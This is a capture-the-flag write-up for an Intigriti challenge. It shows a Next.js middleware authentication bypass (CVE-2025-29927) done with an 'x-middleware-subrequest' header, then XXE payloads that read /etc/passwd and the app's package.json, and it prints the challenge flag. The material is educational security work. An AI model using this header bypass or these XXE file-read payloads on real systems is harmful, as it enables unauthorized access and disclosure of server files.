## Challenge Description

> Find the FLAG and win Intigriti swag! üèÜ

## Useful Resources

-   [Next.js Middleware Auth Bypass (CVE-2025-29927)](https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware)
-   [XML External Entity Injection (XXE)](https://portswigger.net/web-security/xxe)

## Solution

Bastien (BAS10) made most of this challenge. I (CryptoCat) just made the UI _cough_ ChatGPT _cough_ and fixed a few bugs/unintended solutions. It's a lot easier than the typical Intigriti monthly challenge - thankfully, as it came only a week after the crazy chain by 0x999 in the [March '25 challenge](https://bugology.intigriti.io/intigriti-monthly-challenges/0325). Therefore, this one was run more informally, without all the usual prizes, promo, domain name etc.

### Recon

The challenge did not come with source code, so we must follow a black box approach.

#### Site Functionality

The website doesn't appear to have a lot of functionality; there's a homepage and a food menu.

There's also an admin section which, as hackers, should be interesting to us.

![](images/2.PNG)

We might try some basic SQLi, default/common password etc. However, it will get us nowhere. Digging into the client-side code is also fairly unproductive - since it's a NextJS application, the code is hard to read and most of the important stuff is on the server-side.

![](images/3.PNG)

Wait, NextJS? Wasn't there some [crazy vulns](https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware) discovered for it recently ü§î Let's check the version with Wappalyzer üëÄ

![](images/4.PNG)

Back to the advisory:

**CVE-2025-29927** affects **all Next.js versions from 11.1.4 up to 15.1.7** and allows **middleware bypass** via a specially crafted `x-middleware-subrequest` header.

Vulnerability confirmed ‚úÖ

### Next.js Middleware Auth Bypass (CVE-2025-29927)

Middleware in Next.js is commonly used for:

-   Authentication / Authorization
-   Rewrites / Redirects
-   Adding security headers (CSP, etc.)

This vulnerability allows attackers to **bypass middleware protections entirely**, leading to:

-   **Authorization bypass**
-   **Content Security Policy (CSP) bypass**
-   **DoS via Cache Poisoning (CPDoS)**

An auth bypass would be perfect for us! Maybe it can get us into the admin panel without knowing the password?

Let's request the `/admin` page while including the following HTTP header.

```json
x-middleware-subrequest: middleware
```

![](images/5.PNG)

Easy! Now we just need to include this header on each request to maintain our access üòé

![](images/6.PNG)

We can only click on the `Ice Cream Machines` option, which allows us to view the settings of various machines (notoriously buggy/broken at HackDonalds üëÄ)

### XML External Entity Injection (XXE)

So, what do we have here? An XML config input that can be parsed.

![](images/8.PNG)

![](images/9.PNG)

Any CTF player or bug bounty hunter should know what to check for here; XXE üëá

**XXE (XML External Entity)** is a vulnerability that occurs when an XML parser **processes external entities** defined in XML documents. If not properly configured, it can be exploited to:

-   **Read local files** (`file:///etc/passwd`)
-   **Perform SSRF** (e.g., hitting internal services)
-   **DoS** via "billion laughs" attack
-   **Exfiltrate data** via out-of-band channels (OAST, DNS, etc.)

If we replace the parsed input with a payload to read `/etc/passwd`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE machine [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<machine>
  <id>1</id>
  <name>&xxe;</name>
  <temperature>-18</temperature>
  <mixLevel>75</mixLevel>
  <lastMaintenance>2025-03-15</lastMaintenance>
  <cleaningSchedule>Daily</cleaningSchedule>
</machine>
```

We successfully retrieve the file contents!

#### Local File Read (Source Code Disclosure)

Where is the flag though? In a real world scenario, we might look for common files of interest (plenty of wordlists online). Since we know this is a NextJS app, why don't we ask ChatGPT what the common location is and what interesting files it might have?

![](images/11.png)

Nice, so we can try enumerating all of these files starting with the `/app/` directory üòº

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE machine [
  <!ENTITY xxe SYSTEM "file:///app/package.json">
]>
<machine>
  <id>1</id>
  <name>&xxe;</name>
  <temperature>-18</temperature>
  <mixLevel>75</mixLevel>
  <lastMaintenance>2025-03-15</lastMaintenance>
  <cleaningSchedule>Daily</cleaningSchedule>
</machine>
```

![](images/12.png)

There we have our flag: `INTIGRITI{XXE_1n_Ic3Cr34m_M4ch1n3s}` üö©

Some players retrieved the same file from `/proc/self/cwd/package.json` or simply `package.json`
